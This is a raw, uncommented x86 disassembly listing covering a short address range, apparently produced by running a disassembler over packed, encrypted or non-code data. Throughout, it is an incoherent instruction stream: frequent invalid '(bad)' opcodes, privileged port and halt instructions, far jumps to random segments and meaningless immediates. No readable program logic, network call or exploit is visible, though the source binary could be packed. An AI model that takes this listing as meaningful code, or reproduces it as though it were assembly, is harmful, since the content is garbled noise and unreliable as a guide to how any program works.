  41d0a8:	and    al,0x92
  41d0aa:	jl     0x41d082
  41d0ac:	mov    bh,0xc6
  41d0ae:	cli    
  41d0af:	xlat   BYTE PTR ds:[ebx]
  41d0b0:	hlt    
  41d0b1:	fstp   st(2)
  41d0b3:	xor    BYTE PTR [esi+0x67],bl
  41d0b6:	adc    al,dh
  41d0b8:	(bad)  
  41d0b9:	lock iret 
  41d0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0bc:	iret   
  41d0bd:	inc    ecx
  41d0be:	je     0x41d040
  41d0c0:	(bad)  
  41d0c1:	cmp    ah,BYTE PTR [ecx+ecx*1-0xf]
  41d0c5:	jne    0x41d0b2
  41d0c7:	add    ah,BYTE PTR [eax]
  41d0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0ca:	je     0x41d092
  41d0cc:	out    0xc9,al
  41d0ce:	jmp    0x4f6f:0xd1e51d2b
  41d0d5:	push   0xffffffad
  41d0d7:	lea    ebp,[ecx-0x2e]
  41d0da:	(bad)  
  41d0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0dd:	sub    BYTE PTR [esi],0x70
  41d0e0:	pop    ds
  41d0e1:	mov    ch,dh
  41d0e3:	inc    ecx
  41d0e4:	cmc    
  41d0e5:	test   eax,0x7a8bd680
  41d0ea:	ret    
  41d0eb:	pusha  
  41d0ec:	dec    ebx
  41d0ed:	ret    
  41d0ee:	arpl   WORD PTR [ebx],si
  41d0f0:	xchg   ebp,eax
  41d0f1:	sbb    cl,BYTE PTR [edi]
  41d0f3:	xchg   cl,dl
  41d0f5:	mov    ecx,DWORD PTR [ecx]
  41d0f7:	das    
  41d0f8:	imul   eax,DWORD PTR [ebx-0x54315ea0],0xd7554323
  41d102:	out    0x74,eax
  41d104:	pusha  
  41d105:	push   esi
  41d106:	je     0x41d16b
  41d108:	sbb    ebx,0x5823cded
  41d10e:	cmp    BYTE PTR [ebx],bh
  41d110:	repz xchg esp,eax
  41d112:	std    
  41d113:	xor    DWORD PTR [edi+esi*2+0x47],ecx
  41d117:	add    eax,0x4a26fb33
  41d11c:	aas    
  41d11d:	aas    
  41d11e:	sbb    al,0xec
  41d120:	in     al,dx
  41d121:	enter  0x2ddc,0x96
  41d125:	loope  0x41d192
  41d127:	adc    BYTE PTR [edx-0x550e800],0xa
  41d12e:	je     0x41d117
  41d130:	and    eax,0x7c2e3754
  41d135:	fsubr  DWORD PTR [esp+ebp*8]
  41d138:	sbb    eax,0xc356950b
  41d13d:	test   eax,0x3860253
  41d142:	cmp    al,0xc0
  41d144:	in     al,dx
  41d145:	mov    al,0x68
  41d147:	sbb    BYTE PTR [edx-0x1073f6b7],dh
  41d14d:	and    DWORD PTR [eax-0x54b7588c],ebx
  41d153:	int3   
  41d154:	or     al,0xd3
  41d156:	in     al,dx
  41d157:	push   ds
  41d158:	dec    esp
  41d159:	enter  0xf27,0x68
  41d15d:	sbb    ch,bl
  41d15f:	adc    al,0x21
  41d161:	inc    eax
  41d162:	jo     0x41d17b
  41d164:	mov    eax,cs
  41d166:	dec    edi
  41d167:	and    BYTE PTR ds:0x506edad7,bl
  41d16d:	scas   eax,DWORD PTR es:[edi]
  41d16e:	and    BYTE PTR [ebx+0x72852288],0x86
  41d175:	mov    al,0x59
  41d177:	mov    ds:0xee965839,al
  41d17c:	fnstsw WORD PTR [edi+0x1c4729a1]
  41d182:	dec    esp
  41d183:	aaa    
  41d184:	mov    bh,0xa9
  41d186:	fucomip st,st(7)
  41d188:	call   0x3920bc4e
  41d18d:	add    eax,0xcdffdac3
  41d192:	ins    DWORD PTR es:[edi],dx
  41d193:	les    ebp,FWORD PTR [ecx-0x1671930e]
  41d199:	popa   
  41d19a:	test   eax,esi
  41d19c:	cdq    
  41d19d:	and    ah,BYTE PTR [edi+0x4e]
  41d1a0:	mov    dh,0x49
  41d1a2:	adc    BYTE PTR [ecx-0x4b],0xe4
  41d1a6:	and    bh,ah
  41d1a8:	xor    ch,BYTE PTR [edx+ecx*8-0x13]
  41d1ac:	inc    ebx
  41d1ad:	sbb    al,0x8
  41d1af:	jecxz  0x41d230
  41d1b1:	xor    eax,0x6589d0b0
  41d1b6:	pop    ss
  41d1b7:	sbb    eax,0x7ce9e96d
  41d1bc:	cdq    
  41d1bd:	xchg   edx,eax
  41d1be:	inc    ebx
  41d1bf:	pop    eax
  41d1c0:	popa   
  41d1c1:	mov    eax,ds:0x16239a30
  41d1c6:	pop    ebx
  41d1c7:	shl    DWORD PTR [ebp-0x7c],1
  41d1ca:	lea    eax,[edi]
  41d1cc:	lock and eax,0x91474322
  41d1d2:	call   0x268b:0x360f4450
  41d1d9:	retf   0x8444
  41d1dc:	popa   
  41d1dd:	mov    dh,0xc0
  41d1df:	xor    edi,DWORD PTR [eax+0x645d789d]
  41d1e5:	lods   al,BYTE PTR ds:[esi]
  41d1e6:	fimul  DWORD PTR [ecx-0x3e08b297]
  41d1ec:	mov    DWORD PTR [eax-0x39],esp
  41d1ef:	sbb    eax,0x52aebda2
  41d1f4:	cmp    eax,0x98fd409d
  41d1f9:	push   0x535dbb44
  41d1fe:	jmp    0x41d1f3
  41d200:	mul    DWORD PTR [edx-0x26]
  41d203:	fisubr DWORD PTR gs:[esi-0x16]
  41d207:	adc    eax,0xfbad567e
  41d20c:	lods   al,BYTE PTR ds:[esi]
  41d20d:	and    eax,0x15eb85bd
  41d212:	xchg   ebp,eax
  41d213:	icebp  
  41d214:	(bad)  
  41d215:	into   
  41d216:	(bad)  [ebp+0x7c]
  41d219:	stc    
  41d21a:	in     eax,0xd6
  41d21c:	jo     0x41d1f4
  41d21e:	or     DWORD PTR ss:[esi+0x1a],0x3f
  41d223:	xlat   BYTE PTR ds:[ebx]
  41d225:	cvttps2pi mm0,QWORD PTR [edi+0x65]
  41d229:	mov    WORD PTR [esi+edi*1-0x6b],?
  41d22d:	iret   
  41d22e:	mov    ?,WORD PTR [esi]
  41d230:	xchg   esi,eax
  41d231:	mov    DWORD PTR [esi+esi*8-0x37a37593],ebx
  41d238:	(bad)  
  41d239:	mov    esp,0x266cd0b8
  41d23e:	sub    BYTE PTR [ecx-0x71],bl
  41d241:	mov    eax,0xfc5fcdb3
  41d246:	mov    edi,0x65b199bd
  41d24b:	(bad)  
  41d24c:	ret    
  41d24d:	or     eax,0x8a2e14fe
  41d252:	inc    edi
  41d253:	mov    ecx,0xba4e3673
  41d258:	and    cl,BYTE PTR [esi+eiz*2-0x2d38d852]
  41d25f:	sbb    BYTE PTR [esi-0x2f],0x8b
  41d263:	mov    BYTE PTR [edi-0x24d414e5],cl
  41d269:	and    BYTE PTR [esi+0x5726a3e5],cl
  41d26f:	sbb    DWORD PTR [edi+eax*2+0x38],0xffffffa2
  41d274:	imul   eax,DWORD PTR [edi],0xd68957f9
  41d27a:	test   BYTE PTR [esi-0x4e],cl
  41d27d:	mov    edx,0x5da92f87
  41d282:	xor    ch,BYTE PTR [eax+0x62]
  41d285:	inc    ebp
  41d286:	into   
  41d287:	hlt    
  41d288:	js     0x41d236
  41d28a:	mov    esi,0x10356782
  41d28f:	or     eax,0x326a59ea
  41d294:	scas   al,BYTE PTR es:[edi]
  41d295:	mov    dl,0x22
  41d297:	hlt    
  41d298:	pusha  
  41d299:	gs clc 
  41d29b:	ror    DWORD PTR [eax],1
  41d29d:	pusha  
  41d29e:	popf   
  41d29f:	xchg   esp,eax
  41d2a0:	add    eax,0x6cd205d
  41d2a5:	out    0x2d,al
  41d2a7:	sub    DWORD PTR [ebp+0x38],ebp
  41d2aa:	mov    esp,0xe2b1f90f
  41d2af:	(bad)  
  41d2b0:	loope  0x41d2e6
  41d2b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2b3:	push   edx
  41d2b4:	aad    0x3d
  41d2b6:	push   cs
  41d2b7:	inc    esp
  41d2b8:	mov    al,BYTE PTR [eax]
  41d2ba:	dec    ebx
  41d2bb:	test   al,ah
  41d2bd:	mov    al,0x8e
  41d2bf:	mov    ecx,0x5f8f8e42
  41d2c4:	(bad)  [ebp+0x23]
  41d2c7:	and    eax,0x3001498d
  41d2cc:	mov    al,ds:0xc789b115
  41d2d1:	push   ecx
  41d2d2:	xor    DWORD PTR [edx+0x1d],0x11
  41d2d6:	inc    eax
  41d2d7:	cmp    ah,cl
  41d2d9:	call   DWORD PTR [ecx-0x60]
  41d2dc:	mov    ecx,0x41df53
  41d2e1:	in     eax,dx
  41d2e2:	stos   DWORD PTR es:[edi],eax
  41d2e3:	cld    
  41d2e4:	inc    ecx
  41d2e5:	sbb    ah,BYTE PTR [edi+0x7329fe4]
  41d2eb:	add    DWORD PTR ds:0xa85f7188,esp
  41d2f1:	or     DWORD PTR [esi],0x6318695c
  41d2f7:	jl     0x41d2d5
  41d2f9:	mov    dh,0xcf
  41d2fb:	test   al,0x6b
  41d2fd:	mov    eax,ds:0x23364a65
  41d302:	sub    dh,BYTE PTR [ecx]
  41d304:	mov    cl,0x8e
  41d306:	(bad)  [esi-0x1f]
  41d309:	ret    0x6a2c
  41d30c:	inc    ebx
  41d30d:	into   
  41d30e:	mov    al,ds:0x93178549
  41d313:	shr    ebx,1
  41d315:	pop    esi
  41d316:	mov    edi,0x89ddf0b9
  41d31b:	xor    dh,BYTE PTR [eax]
  41d31d:	inc    ebp
  41d31e:	jbe    0x41d2b0
  41d320:	inc    ebx
  41d321:	dec    ecx
  41d322:	(bad)  
  41d323:	sbb    BYTE PTR [ebx+0x107d4982],bh
  41d329:	pop    ebx
  41d32a:	dec    ecx
  41d32b:	rol    BYTE PTR [edi-0x1d],cl
  41d32e:	inc    edx
  41d32f:	ret    
  41d330:	mov    ds,WORD PTR [edi+0x593f946d]
  41d336:	pop    ds
  41d337:	mov    ecx,0x3264924a
  41d33c:	nop
  41d33d:	sbb    BYTE PTR [ebp+edi*8-0x58],cl
  41d341:	dec    eax
  41d342:	xor    bh,al
  41d344:	jp     0x41d37d
  41d346:	pop    eax
  41d347:	mov    ch,0x34
  41d349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d34a:	pop    eax
  41d34b:	add    ebp,DWORD PTR [eax]
  41d34d:	jae    0x41d3b0
  41d34f:	test   al,0xff
  41d352:	or     ebp,edx
  41d354:	xor    BYTE PTR [ebp-0x7e9cefd2],cl
  41d35a:	rcr    edx,1
  41d35c:	ins    BYTE PTR es:[edi],dx
  41d35d:	rcl    esp,cl
  41d35f:	sbb    al,0x4a
  41d361:	jno    0x41d382
  41d363:	and    BYTE PTR [ecx-0x6594fc4f],cl
  41d369:	mov    esp,DWORD PTR [edi+0x1a]
  41d36c:	inc    ebx
  41d36d:	adc    al,0xa4
  41d36f:	dec    ebp
  41d370:	inc    esp
  41d372:	test   al,0xc0
  41d374:	push   ds
  41d375:	xchg   ebp,eax
  41d376:	add    BYTE PTR [eax+0x3f811435],0x58
  41d37d:	or     edi,edi
  41d37f:	mov    eax,0x2669412b
  41d384:	test   BYTE PTR [ebx],ch
  41d386:	nop
  41d387:	scas   eax,DWORD PTR es:[edi]
  41d388:	std    
  41d389:	inc    BYTE PTR [ebx-0x48]
  41d38c:	pusha  
  41d38d:	dec    ebx
  41d38e:	into   
  41d38f:	fimul  WORD PTR [ecx+0x7136e52a]
  41d395:	mov    esi,0x2767ff9a
  41d39a:	push   cs
  41d39b:	sbb    BYTE PTR [eax+0xce424a4],al
  41d3a1:	mov    edx,0x5f10621a
  41d3a6:	push   ebp
  41d3a7:	xor    ah,al
  41d3a9:	div    DWORD PTR [ebp+eiz*2+0x59]
  41d3ad:	push   0x58b1d88e
  41d3b2:	test   al,0xdc
  41d3b4:	fcomp  DWORD PTR [ebx+0x4a]
  41d3b7:	in     al,dx
  41d3b8:	push   ebx
  41d3b9:	mov    ebx,0xfd7cb080
  41d3be:	(bad)  
  41d3bf:	addr16 pop ebx
  41d3c1:	and    dl,ah
  41d3c3:	xor    DWORD PTR [esi+edi*4+0x6e],ebp
  41d3c7:	adc    edi,DWORD PTR [esp+edi*4-0x5bd49465]
  41d3ce:	xchg   DWORD PTR [ebx+0x24],ebx
  41d3d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3d2:	fdivr  DWORD PTR [edi]
  41d3d4:	jmp    0xd642:0x12c2d720
  41d3db:	repnz test ah,0x28
  41d3df:	jno    0x41d454
  41d3e1:	pop    esi
  41d3e2:	in     eax,dx
  41d3e3:	in     eax,0x9
  41d3e5:	inc    esp
  41d3e6:	retf   
  41d3e7:	das    
  41d3e8:	pop    ebx
  41d3e9:	dec    ecx
  41d3ea:	add    DWORD PTR [esi],ecx
  41d3ec:	adc    DWORD PTR [eax-0x20],ebp
  41d3ef:	std    
  41d3f0:	adc    al,0xb6
  41d3f2:	(bad)  
  41d3f3:	mov    ch,0x40
  41d3f5:	cmp    ch,BYTE PTR ds:0x632d20cf
  41d3fb:	shl    DWORD PTR [ebx-0x36],cl
  41d3fe:	es or  eax,0x82ab83f9
  41d404:	jnp    0x41d477
  41d406:	sbb    ecx,DWORD PTR [edx+edi*4-0xe2b1857]
  41d40d:	sbb    ecx,edi
  41d40f:	xchg   esi,eax
  41d410:	test   BYTE PTR [esi],cl
  41d412:	add    al,0x69
  41d414:	js     0x41d3c6
  41d416:	gs test al,0xdd
  41d419:	jne    0x41d424
  41d41b:	push   ecx
  41d41c:	mov    DWORD PTR [ecx],0x3b512910
  41d422:	sar    DWORD PTR [esi+0x9],cl
  41d425:	jmp    0xede5ce06
  41d42a:	mov    cs,WORD PTR [esi]
  41d42c:	add    al,0xb5
  41d42e:	ret    0x1abe
  41d431:	(bad)
  41d435:	call   0xb510:0xeffef696
  41d43c:	fs in  al,dx
  41d43e:	pop    ds
  41d43f:	or     dh,bh
  41d441:	inc    ebp
  41d442:	in     eax,0xd0
  41d444:	xor    edx,DWORD PTR [edx-0x6a]
  41d447:	loop   0x41d41c
  41d449:	add    eax,0x4e24072d
  41d44e:	addr16 mov dh,0x79
  41d451:	xchg   edi,eax
  41d452:	mov    ds:0xd2b3fe87,eax
  41d457:	adc    al,BYTE PTR [ebx-0x11]
  41d45a:	cmp    DWORD PTR [eax],ebx
  41d45c:	xor    edi,ebp
  41d45e:	scas   al,BYTE PTR es:[edi]
  41d45f:	std    
  41d460:	xor    ebp,edx
  41d462:	cmp    al,0xe9
  41d464:	cdq    
  41d465:	loope  0x41d3f9
  41d467:	push   cs
  41d468:	sbb    bl,ch
  41d46a:	add    ecx,DWORD PTR [edi+0x315bfc07]
  41d470:	aaa    
  41d471:	adc    cl,BYTE PTR [ebx+0x41]
  41d474:	in     al,dx
  41d475:	push   es
  41d476:	enter  0xd365,0x16
  41d47a:	test   eax,0x4ca0e16d
  41d47f:	jmp    0x5081:0x793d9ee5
  41d486:	pop    esi
  41d487:	fdiv   QWORD PTR [ecx]
  41d489:	xor    al,0xfc
  41d48b:	out    0x15,eax
  41d48d:	adc    BYTE PTR [ebp+0x5b],ch
  41d490:	dec    ecx
  41d491:	cdq    
  41d492:	lock mov ah,0x87
  41d495:	test   eax,0x36bb224d
  41d49a:	mov    al,ds:0xaf9dc09c
  41d49f:	jp     0x41d4c3
  41d4a1:	mov    DWORD PTR [ebp-0x1e],0x76503629
  41d4a8:	add    al,0x1c
  41d4aa:	call   0x3af1487c
  41d4af:	sar    cl,1
  41d4b1:	mov    ebp,0x7eb94e1e
  41d4b6:	retf   
  41d4b7:	and    edi,edi
  41d4b9:	ret    
  41d4ba:	icebp  
  41d4bb:	bound  ebx,QWORD PTR [eax+ebx*4-0x473a956d]
  41d4c2:	popa   
  41d4c3:	call   0xa2328d8c
  41d4c8:	pop    ecx
  41d4c9:	out    0x9d,al
  41d4cb:	dec    ebx
  41d4cc:	dec    esp
  41d4cd:	jl     0x41d45c
  41d4cf:	push   ds
  41d4d0:	cld    
  41d4d1:	loopne 0x41d462
  41d4d3:	inc    eax
  41d4d4:	sub    al,0xb8
  41d4d6:	scas   eax,DWORD PTR es:[edi]
  41d4d7:	sub    DWORD PTR ds:0x3a621063,esi
  41d4dd:	or     BYTE PTR [ecx-0x47baa1ca],dl
  41d4e3:	pop    ss
  41d4e4:	sub    eax,0x42344383
  41d4e9:	fld    DWORD PTR [ebx-0x1e1ee21f]
  41d4ef:	(bad)  
  41d4f0:	or     al,BYTE PTR [ebx]
  41d4f2:	leave  
  41d4f3:	aad    0x15
  41d4f5:	xor    al,0x8f
  41d4f7:	lods   al,BYTE PTR ds:[esi]
  41d4f8:	push   es
  41d4f9:	sub    al,0xd8
  41d4fb:	(bad)  
  41d4fc:	out    0xdc,al
  41d4fe:	pusha  
  41d4ff:	xor    al,0x95
  41d501:	push   esi
  41d502:	pop    ss
  41d503:	mov    edx,0x70fc7d72
  41d508:	adc    eax,ebp
  41d50a:	or     DWORD PTR [edx-0x5ba6a48c],esi
  41d510:	add    BYTE PTR [esi],dl
  41d512:	cmp    bh,bl
  41d514:	xchg   edi,eax
  41d515:	mov    ds:0x22d7de87,eax
  41d51a:	push   ss
  41d51b:	(bad)  
  41d51c:	repnz mov ebx,0x99fbfb2a
  41d522:	adc    BYTE PTR [edi-0x4c],ch
  41d525:	xchg   esi,eax
  41d526:	mov    eax,0xe7d48c30
  41d52b:	jg     0x41d56a
  41d52d:	in     al,dx
  41d52e:	mov    cl,0x66
  41d530:	pusha  
  41d531:	in     al,dx
  41d532:	mov    ?,WORD PTR [edx-0x44]
  41d535:	ret    0x1cf
  41d538:	(bad)  
  41d539:	xchg   ebx,eax
  41d53a:	scas   eax,DWORD PTR es:[edi]
  41d53b:	push   0x71e6622e
  41d540:	iret   
  41d541:	je     0x41d52c
  41d543:	pop    ds
  41d544:	jne    0x41d5b4
  41d546:	std    
  41d547:	hlt    
  41d548:	mov    WORD PTR [esi+0x2e],fs
  41d54b:	jnp    0x41d507
  41d54d:	mov    ebp,0x2dae1716
  41d552:	leave  
  41d553:	xchg   ebx,eax
  41d554:	mov    cl,0x27
  41d556:	cmc    
  41d557:	sub    dl,BYTE PTR [ecx-0x15]
  41d55a:	das    
  41d55b:	lea    ebx,[eax+0x22]
  41d55e:	xchg   esp,eax
  41d55f:	out    0x35,eax
  41d561:	dec    ebp
  41d562:	scas   al,BYTE PTR es:[edi]
  41d563:	bound  edx,QWORD PTR [ecx+0x3a]
  41d566:	xchg   edx,eax
  41d567:	pop    edi
  41d568:	mov    esi,0xd9d34959
  41d56d:	sub    dl,bh
  41d56f:	in     al,0x3b
  41d571:	out    dx,al
  41d572:	rcr    BYTE PTR [esi-0x63351841],1
  41d578:	pop    ss
  41d579:	xchg   ecx,eax
  41d57a:	push   edi
  41d57b:	mov    DWORD PTR [edx-0x17],ebx
  41d57e:	cmp    DWORD PTR [eax],0x3c
  41d581:	inc    DWORD PTR [ebx+0x47]
  41d584:	lea    ebp,[esi+0x63f49bcc]
  41d58a:	dec    ebx
  41d58b:	and    DWORD PTR [edx+0x2e064c81],ecx
  41d591:	jnp    0x41d600
  41d593:	inc    ebx
  41d594:	enter  0xaf86,0x8
  41d598:	sbb    BYTE PTR [ebx+0x1fe19e23],al
  41d59e:	mov    ebp,0x20812974
  41d5a3:	dec    esi
  41d5a4:	xchg   edi,eax
  41d5a5:	daa    
  41d5a6:	repz inc esp
  41d5a8:	lea    ebx,[esi+0x2d358410]
  41d5ae:	retf   
  41d5af:	leave  
  41d5b0:	inc    ebx
  41d5b1:	ins    DWORD PTR es:[di],dx
  41d5b3:	popa   
  41d5b4:	mov    al,0x80
  41d5b6:	int3   
  41d5b7:	push   edi
  41d5b8:	rcl    DWORD PTR [edx-0x7b],cl
  41d5bb:	scas   al,BYTE PTR es:[edi]
  41d5bc:	push   ebx
  41d5bd:	add    eax,0xee2735b
  41d5c2:	mov    edx,0xe55b69a6
  41d5c7:	push   0x5e2d8d4c
  41d5cc:	mov    ebp,0x50b23634
  41d5d1:	rcl    DWORD PTR [ebp+eiz*2-0x322127d8],1
  41d5d8:	pop    es
  41d5d9:	pop    ecx
  41d5da:	sbb    ebx,0x5e
  41d5dd:	in     al,dx
  41d5de:	push   ecx
  41d5df:	sub    bh,ah
  41d5e1:	mov    ds:0xfb7e64df,eax
  41d5e6:	xor    ah,BYTE PTR [edx]
  41d5e8:	pop    edi
  41d5e9:	das    
  41d5ea:	sub    DWORD PTR [eax+0x64],edi
  41d5ed:	(bad)  [ecx+0x3e]
  41d5f0:	aam    0x33
  41d5f2:	mov    eax,ds:0x3ef0269a
  41d5f7:	popa   
  41d5f8:	jne    0x41d604
  41d5fa:	ds gs xor al,0x5
  41d5fe:	rcr    esi,cl
  41d600:	popa   
  41d601:	loopne 0x41d5f0
  41d603:	jns    0x41d5bf
  41d605:	pop    edi
  41d606:	scas   al,BYTE PTR es:[edi]
  41d607:	sar    DWORD PTR [edi-0x2164ba45],1
  41d60d:	ins    BYTE PTR es:[edi],dx
  41d60e:	cmp    al,0xb6
  41d610:	in     eax,dx
  41d611:	mov    ds:0xa44f7329,eax
  41d616:	xor    eax,DWORD PTR [ebp+0x71]
  41d619:	and    ebx,0xffffffa2
  41d61c:	and    DWORD PTR [edx+0x2b],edi
  41d61f:	test   eax,0xbdcdbe9c
  41d624:	sub    edx,ecx
  41d626:	pushf  
  41d627:	jmp    0x621a:0x77e697bb
  41d62e:	adc    dl,dl
  41d630:	ret    0x3549
  41d633:	push   edx
  41d634:	dec    esp
  41d635:	(bad)  
  41d636:	pusha  
  41d637:	popa   
  41d638:	dec    DWORD PTR [eax+0x4710aca9]
  41d63e:	ror    DWORD PTR [eax+0x39560226],0x6
  41d645:	push   ss
  41d646:	aaa    
  41d647:	mov    esi,0x5d7af4e0
  41d64c:	les    ecx,FWORD PTR [ecx]
  41d64e:	(bad)  
  41d64f:	and    ebx,esi
  41d651:	fcmovne st,st(3)
  41d653:	idiv   BYTE PTR [edi-0xf]
  41d656:	gs dec ecx
  41d658:	jnp    0x41d68c
  41d65a:	popw   es
  41d65c:	ins    DWORD PTR es:[edi],dx
  41d65d:	pushf  
  41d65e:	pop    edi
  41d65f:	outs   dx,DWORD PTR ds:[esi]
  41d660:	fiadd  DWORD PTR [ebp-0x74]
  41d663:	sbb    DWORD PTR [esi],esi
  41d665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d666:	outs   dx,BYTE PTR ds:[esi]
  41d667:	lods   eax,DWORD PTR ds:[esi]
  41d668:	pop    ss
  41d669:	pop    esp
  41d66a:	scas   al,BYTE PTR es:[edi]
  41d66b:	js     0x41d62d
  41d66d:	fdiv   QWORD PTR [edi+0x9]
  41d670:	subps  xmm3,XMMWORD PTR [ebp+0x738d0dee]
  41d677:	add    dl,ah
  41d679:	mov    cl,0x90
  41d67b:	pop    esp
  41d67c:	iret   
  41d67d:	es dec edi
  41d67f:	jmp    0x41d676
  41d681:	or     edx,DWORD PTR [esi]
  41d683:	and    dh,BYTE PTR [eax-0x76]
  41d686:	sbb    edx,DWORD PTR [ebp-0x30c79746]
  41d68c:	mov    esi,DWORD PTR [ecx+0x7b632bf4]
  41d692:	aam    0x6f
  41d694:	enter  0x1ed1,0x3
  41d698:	xchg   esi,eax
  41d699:	push   es
  41d69a:	call   0x9c4a:0x8d3bbd39
  41d6a1:	mov    ecx,0x6c6c6ace
  41d6a6:	pop    ds
  41d6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6a8:	xchg   edx,eax
  41d6a9:	icebp  
  41d6aa:	jecxz  0x41d727
  41d6ac:	fisubr DWORD PTR [ebx-0x5b]
  41d6af:	lock cwde 
  41d6b1:	and    esp,ecx
  41d6b3:	mov    ds:0xda3707df,al
  41d6b8:	and    BYTE PTR [ecx],bl
  41d6ba:	mov    al,ds:0xf650c24f
  41d6bf:	mov    esp,0x3b8f7426
  41d6c4:	or     al,0xb3
  41d6c6:	sahf   
  41d6c7:	cmp    eax,0x1aa230a4
  41d6cc:	je     0x41d68a
  41d6ce:	stos   BYTE PTR es:[edi],al
  41d6cf:	push   ss
  41d6d0:	inc    edi
  41d6d1:	rol    BYTE PTR [esp+ebp*1-0x9be6872],0xd3
  41d6d9:	mov    bh,0xbf
  41d6db:	adc    eax,0xd1bc7659
  41d6e0:	sub    al,0x7e
  41d6e2:	call   0x2d5d7391
  41d6e7:	mov    eax,0x3c23591a
  41d6ec:	and    DWORD PTR [ebx-0x772313a2],0xfffffffa
  41d6f3:	ret    
  41d6f4:	mov    ds:0x2ed81ef7,eax
  41d6f9:	push   edi
  41d6fa:	test   al,0xa2
  41d6fc:	iret   
  41d6fd:	xor    BYTE PTR [edx+0x1db258ce],0x1c
  41d704:	js     0x41d692
  41d706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d707:	push   ebp
  41d708:	out    dx,eax
  41d709:	sbb    dl,bh
  41d70b:	cmp    al,0x74
  41d70d:	clc    
  41d70e:	xchg   ebp,eax
  41d70f:	pop    esi
  41d710:	inc    ecx
  41d711:	imul   edi,DWORD PTR [eax+ebx*1],0x1cb16cc5
  41d718:	int3   
  41d719:	or     al,0x7d
  41d71b:	iret   
  41d71c:	fisubr WORD PTR ds:0x1a3868ef
  41d722:	hlt    
  41d723:	sti    
  41d724:	or     edi,DWORD PTR [eax-0x2883396]
  41d72a:	(bad)  
  41d72b:	dec    esp
  41d72c:	std    
  41d72d:	xchg   edi,eax
  41d72e:	test   al,0xdb
  41d730:	in     al,dx
  41d731:	hlt    
  41d732:	cmc    
  41d733:	xor    BYTE PTR [ebx],0x7a
  41d736:	inc    ecx
  41d737:	push   edx
  41d738:	lods   eax,DWORD PTR ds:[esi]
  41d739:	xor    esp,DWORD PTR [eax+0x2021e0e4]
  41d73f:	outs   dx,DWORD PTR ds:[esi]
  41d740:	push   esi
  41d741:	mov    ebx,0x58906a88
  41d746:	jbe    0x41d728
  41d748:	sub    edx,DWORD PTR ds:0x63e1cc46
  41d74e:	adc    eax,0xe7da001c
  41d753:	loop   0x41d70f
  41d755:	push   ss
  41d756:	sub    eax,0xd09a315a
  41d75b:	sahf   
  41d75c:	push   cs
  41d75d:	mov    ebx,0x9b2a096e
  41d762:	jo     0x41d75c
  41d764:	add    BYTE PTR [edi+0x49],cl
  41d767:	sub    DWORD PTR [eax],esi
  41d769:	or     ch,BYTE PTR [eax]
  41d76b:	aas    
  41d76c:	fwait
  41d76d:	dec    esp
  41d76e:	cdq    
  41d76f:	out    0x5e,al
  41d771:	mov    cl,0x1b
  41d773:	int    0xcc
  41d775:	fadd   DWORD PTR [ebx-0x47]
  41d778:	cdq    
  41d779:	js     0x41d7d4
  41d77b:	jno    0x41d78f
  41d77d:	out    0xbe,eax
  41d77f:	shl    DWORD PTR [edx-0x28],1
  41d782:	lds    esi,FWORD PTR [eax-0x4f3a1161]
  41d788:	or     BYTE PTR [ecx+0x5186f2ea],0xc0
  41d78f:	jle    0x41d742
  41d791:	pop    ss
  41d792:	rol    BYTE PTR [eax+0x5c],1
  41d795:	pop    ds
  41d796:	mov    edx,0xba2fb6d5
  41d79b:	xor    cl,ah
  41d79d:	or     ebx,DWORD PTR [esi-0x49dfc7a7]
  41d7a3:	sbb    dl,bh
  41d7a5:	push   esp
  41d7a6:	pop    ebp
  41d7a7:	mov    ?,WORD PTR [ebx+0x381c1786]
  41d7ad:	fmul   QWORD PTR [ebx+0x4b]
  41d7b0:	hlt    
  41d7b1:	loop   0x41d81b
  41d7b3:	add    edi,DWORD PTR [edi+ebp*4]
  41d7b6:	outs   dx,BYTE PTR ds:[esi]
  41d7b7:	xor    al,0xaf
  41d7b9:	outs   dx,BYTE PTR ds:[esi]
  41d7ba:	jmp    DWORD PTR [ebx+eax*1]
  41d7bd:	cli    
  41d7be:	das    
  41d7bf:	icebp  
  41d7c0:	push   0x1c
  41d7c2:	ins    BYTE PTR es:[edi],dx
  41d7c3:	or     DWORD PTR [esi+esi*2-0x1d568c89],eax
  41d7ca:	jl     0x41d838
  41d7cc:	(bad)  
  41d7cd:	(bad)  
  41d7ce:	adc    al,0x81
  41d7d0:	das    
  41d7d1:	sbb    BYTE PTR [esi-0x1859029],cl
  41d7d7:	and    eax,DWORD PTR [ebx+0x48237991]
  41d7dd:	xchg   DWORD PTR [ecx+edi*1+0x27],eax
  41d7e1:	sahf   
  41d7e2:	adc    bl,BYTE PTR [ecx+0x32244f84]
  41d7e8:	sbb    edx,DWORD PTR [ebx-0x15b76f15]
  41d7ee:	iret   
  41d7ef:	xor    eax,0x257eb4bd
  41d7f4:	push   0x4
  41d7f6:	shl    BYTE PTR [ebx+0x14f752c7],0x36
  41d7fd:	mov    bp,0x2874
  41d801:	imul   eax,DWORD PTR [edx+0x54],0x7a6fb3ae
  41d808:	sti    
  41d809:	jle    0x41d868
  41d80b:	iret   
  41d80c:	repnz stc 
  41d80e:	(bad)  
  41d810:	xor    al,0x46
  41d812:	std    
  41d813:	xor    al,0x3a
  41d815:	call   0xeaf6d7fa
  41d81a:	stos   DWORD PTR es:[edi],eax
  41d81b:	stos   BYTE PTR es:[edi],al
  41d81c:	inc    ebx
  41d81d:	inc    edx
  41d81e:	loop   0x41d86f
  41d820:	rcr    BYTE PTR [esi],1
  41d822:	fwait
  41d823:	imul   eax,edi,0xf946ea92
  41d829:	cmp    ebx,DWORD PTR [ecx-0x6c7b3733]
  41d82f:	popa   
  41d830:	loopne 0x41d8a4
  41d832:	xchg   esi,eax
  41d833:	retf   0x566f
  41d836:	or     ch,BYTE PTR [edi]
  41d838:	push   0xffffffff
  41d83a:	xchg   esp,eax
  41d83b:	daa    
  41d83c:	dec    ebp
  41d83d:	fsub   QWORD PTR [ebp-0x1f470a24]
  41d843:	(bad)  
  41d844:	jae    0x41d861
  41d846:	retf   0x3b5f
  41d849:	sub    bh,bh
